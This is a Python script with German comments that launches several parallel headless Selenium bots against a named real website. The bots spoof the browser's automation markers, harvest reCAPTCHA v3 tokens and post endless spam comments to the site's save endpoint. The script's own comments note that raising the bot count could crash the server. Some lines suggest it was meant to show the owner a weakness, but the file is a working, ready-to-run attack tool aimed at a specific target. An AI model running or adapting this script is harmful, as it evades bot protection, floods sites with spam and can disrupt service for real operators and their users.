# mega_spam_forever.py
import threading
import requests
import time
import random
import string
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By

# ==== Konfiguration ====
SITE_URL = "https://febel.ch/Kommentare.html"
SAVE_URL = "https://febel.ch/save.php"

# Wie viele parallele Bots gleichzeitig spammen sollen
PARALLEL_BOTS = 8        # 8 = sehr aggressiv, 15+ = Server könnte abstürzen
DELAY_BETWEEN_POSTS = 1  # Sekunden zwischen Posts (kann auf 0.1 runter)

# ==== Schneller, headless Driver (kein Fenster, kein Delay) ====
def get_fast_driver():
    options = Options()
    options.add_argument('--headless=new')                    # unsichtbar & schnell
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-blink-features=AutomationControlled')
    options.add_argument('--disable-infobars')
    options.add_argument('--window-size=800,600')
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)

    service = Service()
    driver = webdriver.Chrome(service=service, options=options)
    
    driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": "Object.defineProperty(navigator, 'webdriver', {get: () => false});"
    })
    return driver

# ==== Token holen – optimiert auf Speed ====
def get_token_fast():
    driver = get_fast_driver()
    try:
        driver.get(SITE_URL)
        for _ in range(20):
            time.sleep(0.8)  # reCAPTCHA v3 braucht ~1-3 Sekunden
            token = driver.find_element(By.ID, "recaptchaResponse").get_attribute("value")
            if token and len(token) > 200:
                return token
        return None
    except:
        return None
    finally:
        driver.quit()

# ==== Ein einzelner Spam-Bot (läuft endlos) ====
def spam_bot(bot_id):
    success_count = 0
    while True:
        try:
            token = get_token_fast()
            if not token:
                print(f"[Bot {bot_id}] Kein Token – warte 2s")
                time.sleep(2)
                continue

            payload = {
                "name": f"☢️ NUKLEAR BOT #{bot_id}",
                "email": f"nuke{bot_id}@spam.ch",
                "comment": f"UNENDLICHER SPAM #∞ | Bot-ID: {bot_id} | Zeit: {datetime.now().strftime('%H:%M:%S')} | "
                          f"Erfolg #{success_count + 1}\n"
                          f"DEINE SEITE IST OFFEN WIE EIN Scheunentor! 🔥",
                "recaptcha_response": token
            }

            r = requests.post(SAVE_URL, data=payload, timeout=8)
            if r.status_code == 200:
                success_count += 1
                print(f"[Bot {bot_id}] SPAM #{success_count} erfolgreich gesendet! (Total: ~{success_count * PARALLEL_BOTS})")
            else:
                print(f"[Bot {bot_id}] Fehler: {r.status_code}")

            time.sleep(DELAY_BETWEEN_POSTS + random.uniform(0, 0.5))

        except Exception as e:
            print(f"[Bot {bot_id}] Crash: {e}")
            time.sleep(3)

# ==== START: Alle Bots gleichzeitig loslassen ====
if __name__ == "__main__":
    print(f"START DER APOKALYPSE: {PARALLEL_BOTS} Bots greifen an...")
    print("Drücke STRG+C zum Stoppen (wenn du genug gelernt hast)")

    # Starte alle Bots in eigenen Threads
    for i in range(1, PARALLEL_BOTS + 1):
        t = threading.Thread(target=spam_bot, args=(i,), daemon=True)
        t.start()
        time.sleep(0.5)  # leicht gestaffelt starten

    # Endlos laufen lassen
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nSpam-Angriff gestoppt. Schau jetzt auf deine Seite – sie sollte voll sein.")
